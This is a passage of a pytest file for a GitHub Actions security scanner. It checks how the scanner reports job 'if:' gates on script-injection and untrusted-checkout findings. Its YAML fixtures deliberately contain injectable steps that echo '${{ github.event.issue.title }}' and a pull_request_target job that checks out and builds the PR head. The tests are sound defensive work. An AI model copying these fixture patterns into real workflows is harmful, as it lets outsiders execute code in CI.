    evidence = _p14_10_evidence(tmp_path, "compound.yml", (
        "on:\n"
        "  issues:\n"
        "    types: [opened]\n"
        "jobs:\n"
        "  create-issue:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: >-\n"
        "      github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "      && github.event.issue.user.login == 'trusted-owner'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.issue.title }}'\n"
    ))
    assert "does not restrict who reaches this job" not in evidence, (
        f"a compound gate with a live term was called wide open: {evidence!r}"
    )
    assert "verify it" in evidence, (
        f"an undecidable gate must keep the verify wording: {evidence!r}"
    )
    assert "no trigger this workflow declares" in evidence, (
        f"the dead term is still worth naming: {evidence!r}"
    )


def test_a_dead_term_in_a_compound_gate_is_not_called_harmless(
    tmp_path: Path,
) -> None:
    """Declining a whole-gate verdict must not become a claim that the dead
    term does nothing.

    A dead term is a CONSTANT, and a constant is the opposite of harmless in a
    compound: `A && (null == 'bot')` is always false, so that comparison closes
    the entire gate on its own, and `A || (null != 'bot')` is always true, so it
    opens the gate no matter what `A` says. Telling the reader the comparison
    "cannot restrict anything" is exactly backwards in the first case and
    understates the second.
    """
    for name, operator, joiner in (
        ("and_eq.yml", "==", "&&"),
        ("or_ne.yml", "!=", "||"),
    ):
        evidence = _p14_10_evidence(tmp_path, name, (
            "on:\n"
            "  issues:\n"
            "    types: [opened]\n"
            "jobs:\n"
            "  create-issue:\n"
            "    runs-on: ubuntu-latest\n"
            "    if: >-\n"
            "      github.event.issue.user.login == 'trusted-owner'\n"
            f"      {joiner} github.event.pull_request.user.login "
            f"{operator} 'dependabot[bot]'\n"
            "    steps:\n"
            "      - run: echo '${{ github.event.issue.title }}'\n"
        ))
        assert "cannot restrict anything" not in evidence, (
            f"{name}: a constant term that can decide the whole gate was "
            f"described as unable to restrict anything: {evidence!r}"
        )
        assert "no trigger this workflow declares" in evidence, (
            f"{name}: the dead term is still worth naming: {evidence!r}"
        )
        assert "verify it" in evidence, (
            f"{name}: an undecidable gate must keep the verify wording: "
            f"{evidence!r}"
        )


def _p14_10_hit(tmp_path: Path, name: str, body: str) -> dict:
    _write_workflow(tmp_path, name, body)
    data = _scan_dir(tmp_path)
    hits = [f for f in data["findings"] if f["pattern"] == "P14.10"]
    assert hits, "expected the P14.10 injection finding"
    return hits[0]


_SNOWFLAKE_JOB = (
    "jobs:\n"
    "  create-issue:\n"
    "    runs-on: ubuntu-latest\n"
    "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
    "    steps:\n"
    "      - run: echo '${{ github.event.issue.title }}'\n"
)


def test_the_gate_verdict_is_not_dressed_as_quoted_source(
    tmp_path: Path,
) -> None:
    """P14.10's evidence is a verbatim excerpt, rendered by report.py inside a
    ```yaml fence with a line-number gutter. A sentence the scanner assembled
    does not belong in there — `RawHit.derived_note` is the channel built for
    "this quoted line, because of a condition elsewhere in the job"."""
    hit = _p14_10_hit(
        tmp_path, "jira_issue.yml",
        "on:\n  issues:\n    types: [opened]\n" + _SNOWFLAKE_JOB,
    )
    for line in hit["evidence"].splitlines():
        assert re.match(r"\s*\d+:(?: |$)", line), (
            f"non-source line inside verbatim evidence: {line!r}"
        )
    assert "inert" in (hit.get("derived_note") or "").lower(), (
        f"the gate verdict is missing from derived_note: {hit!r}"
    )


def test_a_live_gate_puts_no_bypass_sentence_on_an_injection_finding(
    tmp_path: Path,
) -> None:
    """"The finding stands only if that gate can be bypassed" is true of the
    correlated chains, whose payoff leg IS the untrusted trigger. It is false
    of an injection: the catalog says occurrences on trusted triggers "still
    execute attacker-influenced text as shell and are mechanical to fix". On
    P14.10 the note is carried only when the gate is provably dead."""
    hit = _p14_10_hit(
        tmp_path, "pr.yml",
        "on:\n  pull_request_target:\njobs:\n  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.pull_request.title }}'\n",
    )
    assert not (hit.get("derived_note") or ""), (
        f"a live gate produced a bypass sentence: {hit!r}"
    )
    assert "gate condition" not in hit["evidence"], (
        f"the gate sentence leaked into the verbatim evidence: {hit!r}"
    )


def test_a_step_level_gate_withdraws_the_job_level_verdict(
    tmp_path: Path,
) -> None:
    """The finding is a STEP; the gate we judge is the JOB's. When the step
    carries its own `if:`, "the gate does not restrict who reaches this job"
    is true of the job and misleading about the finding — the step's own
    guard is the live control and this code never looked at it."""
    hit = _p14_10_hit(
        tmp_path, "stepgate.yml",
        "on:\n  issues:\n    types: [opened]\n"
        "jobs:\n  create-issue:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - if: github.event.issue.user.login == 'trusted-owner'\n"
        "        run: echo '${{ github.event.issue.title }}'\n",
    )
    assert not (hit.get("derived_note") or ""), (
        f"a step with its own gate still got the job-level verdict: {hit!r}"
    )
    assert "gate condition" not in hit["evidence"], (
        f"a step with its own gate still got the job-level verdict: {hit!r}"
    )


def test_deployment_events_do_populate_workflow_run() -> None:
    """`deployment` and `deployment_status` payloads carry top-level
    `workflow_run` (and `workflow`) whenever the deployment came from a
    workflow, which is the normal case. Calling such a gate dead is the
    "your working gate is useless" failure this check exists to avoid."""
    for trigger in ("deployment", "deployment_status"):
        note = scan._gate_note(
            {"if": "github.event.workflow_run.conclusion == 'success'"},
            [trigger],
        )
        assert "inert" not in note.lower(), (trigger, note)
        assert "never runs" not in note.lower(), (trigger, note)


def test_a_literal_that_casts_to_zero_declines_the_verdict() -> None:
    """GitHub casts mismatched types to a number, so an absent value (0)
    compares EQUAL to '0' just as it does to ''. Every zero-valued literal
    inverts the operator table, so no verdict is offered for one."""
    note = scan._gate_note(
        {"if": "github.event.pull_request.number == '0'"}, ["issues"],
    )
    assert "never runs" not in note.lower(), note
    assert "always false" not in note.lower(), note
    assert "no trigger this workflow declares" in note, note
    # And it must not invent a remainder: `== '0'` IS the whole condition.
    assert "the rest of the condition decides" not in note, note
    assert "which is not evaluated here — verify it" in note, note


def test_ubiquitous_event_fields_are_never_judged_inert(tmp_path: Path) -> None:
    """`github.event.sender` rides on every webhook payload but appears in no
    trigger's table entry, so only the `_GATE_CHECKED_OBJECTS` intersection
    keeps it from reading as absent. Without it, an ordinary workflow is told
    its gate does nothing."""
    hit = _p14_10_hit(
        tmp_path, "sender.yml",
        "on:\n  pull_request_target:\n"
        "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    if: github.event.sender.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - run: echo '${{ github.event.pull_request.title }}'\n",
    )
    assert not (hit.get("derived_note") or ""), (
        f"a field present in every payload was judged inert: {hit!r}"
    )


def test_a_workflow_with_no_parseable_triggers_yields_no_verdict(
    tmp_path: Path,
) -> None:
    """Zero KNOWN triggers is not zero populated objects — it is no
    information. `_on_trigger_names` returns [] for an absent, null or
    unparseable `on:`, and this detector has no `on:` guard of its own."""
    hit = _p14_10_hit(
        tmp_path, "noon.yml",
        "name: fragment\n"
        "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    if: github.event.pull_request.user.login != 'dependabot[bot]'\n"
        "    steps:\n      - run: echo '${{ github.event.issue.title }}'\n",
    )
    assert not (hit.get("derived_note") or ""), (
        f"an unknown trigger set produced a verdict: {hit!r}"
    )


def test_a_schedule_only_workflow_can_reach_an_inert_verdict() -> None:
    """`schedule` is the one table entry mapping to the empty set, and the
    trigger most likely to PRODUCE a verdict: a cron run populates no event
    object at all, so every trust gate built on one is dead."""
    note = scan._gate_note(
        {"if": "github.event.pull_request.user.login != 'dependabot[bot]'"},
        ["schedule"],
    )
    assert "INERT" in note, note
    assert "does not restrict who reaches this job" in note, note


def test_two_dead_objects_read_as_a_plural_sentence() -> None:
    """The sentence is the reader-facing product of the whole check; naming
    two objects and then saying "that comparison is" reads as a bug."""
    note = scan._gate_note(
        {"if": "github.event.pull_request.number > 0 || github.event.release.tag_name != ''"},
        ["issues"],
    )
    assert "`github.event.pull_request`" in note, note
    assert "`github.event.release`" in note, note
    assert "those comparisons are against an empty value" in note, note
    assert "that comparison is" not in note, note


def test_the_gate_note_trigger_list_stays_a_required_argument() -> None:
    """`triggers` is a required parameter precisely so a call site that
    forgets it is a TypeError rather than a check that silently stops
    reporting. Pin the signature so nobody restores the default."""
    import inspect

    params = inspect.signature(scan._gate_note).parameters
    assert params["triggers"].default is inspect.Parameter.empty, (
        "triggers must stay required — a defaulted trigger list turns a "
        "missed call site into permanent silence on a security verdict"
    )


def test_the_untrusted_checkout_chain_also_names_an_inert_gate(
    tmp_path: Path,
) -> None:
    """P14.9's correlation site takes the same gate note. Nothing pinned that
    it could fire at all — reverting that call site to the one-argument form
    left the whole suite green."""
    _write_workflow(tmp_path, "pwn.yml", (
        "on: pull_request_target\n"
        "jobs:\n"
        "  bench:\n"
        "    runs-on: ubuntu-latest\n"
        "    if: github.event.issue.user.login != 'dependabot[bot]'\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n"
        "      - run: make bench\n"
    ))
    data = _scan_dir(tmp_path)
    hits = [f for f in data["findings"] if f["pattern"] == "P14.9"]
    assert hits, "expected the P14.9 untrusted-checkout chain finding"
    assert "INERT" in hits[0]["evidence"], hits[0]["evidence"]


def test_a_dead_term_in_a_disjunction_claims_no_remainder() -> None:
    """The neutral wording used to say "the rest of the condition decides who
    reaches this job". That assumes AND. Under OR the dead term can decide the
    whole gate by itself — snowflakedb's real gate is a disjunction, and there
    "verify the remainder" points the reader away from the live problem. There
    is no evaluator here, so the honest note claims nothing about the rest."""
    real = (
        "((github.event_name == 'issue_comment' && "
        "github.event.comment.user.login == 'sfc-gh-mkeller') || "
        "(github.event_name == 'issues' && "
        "github.event.pull_request.user.login != 'wss[bot]'))"
    )
    note = scan._gate_note({"if": real}, ["issues", "issue_comment"])
    assert "the rest of the condition decides" not in note, note
    assert "stands only if that remainder can be bypassed" not in note, note
    assert "no trigger this workflow declares" in note, note


def test_a_lone_declined_comparison_claims_no_remainder() -> None:
    """`!= 0` is unquoted and `!(...)` is a negation, so neither settles a
    direction — but both ARE the whole condition. Saying "the rest of the
    condition decides" invents a remainder that does not exist."""
    for cond in (
        "github.event.pull_request.number != 0",
        "!(github.event.pull_request.user.login == 'bot')",
        "github.event.pull_request.number == '0'",
    ):
        note = scan._gate_note({"if": cond}, ["issues"])
        assert "the rest of the condition decides" not in note, (cond, note)


def test_an_object_named_inside_a_string_literal_is_not_read_by_the_gate(
) -> None:
    """`_GATE_EVENT_REF_RE` scans the raw condition text, so a `github.event.`
    mention inside a quoted string counted as an object the gate reads. That
    turned a perfectly live gate into a dead-field report."""
    note = scan._gate_note(
        {"if": "github.event.pull_request.user.login != "
               "'filed by github.event.discussion bot'"},
        ["pull_request_target"],
    )
    # The note quotes the condition verbatim, so the literal's text appears;
    # what must NOT appear is the claim that the gate READS that object.
    assert "`github.event.discussion`" not in note, note
    assert "no trigger this workflow declares" not in note, note
    assert "verify it" in note, note


def test_only_a_legal_json_number_worth_zero_declines_the_verdict() -> None:
    """GitHub parses a string "from any legal JSON number format, otherwise
    NaN". `'+0'` and `' 0 '` are not legal JSON numbers, so GitHub reads NaN,
    the comparison is not equal to an absent value, and a verdict IS
    available. Python's `float()` accepts all three, so using it as the parser
    threw those verdicts away."""
    for literal in ("+0", " 0 "):
        note = scan._gate_note(
            {"if": f"github.event.pull_request.number != '{literal}'"},
            ["issues"],
        )
        assert "INERT" in note, (literal, note)
    for literal in ("0", "0.0", "-0", "0e5", ""):
        note = scan._gate_note(
            {"if": f"github.event.pull_request.number != '{literal}'"},
            ["issues"],
        )
        assert "INERT" not in note, (literal, note)


def test_evidence_gutter_check_tolerates_a_blank_source_line(
    tmp_path: Path,
) -> None:
    """A blank line inside the quoted excerpt renders as a bare `NN:`. Any
    assertion about evidence shape has to allow it, or it only passes on
    fixtures that happen to have no blank lines."""
    hit = _p14_10_hit(
        tmp_path, "blank.yml",
        "on:\n  issues:\n    types: [opened]\n"
        "jobs:\n  create-issue:\n    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - name: file\n"
        "        run: echo '${{ github.event.issue.title }}'\n"
        "\n"
        "      - run: true\n",
    )
    for line in hit["evidence"].splitlines():
        assert re.match(r"\s*\d+:(?: |$)", line), (
            f"non-source line inside verbatim evidence: {line!r}"
        )
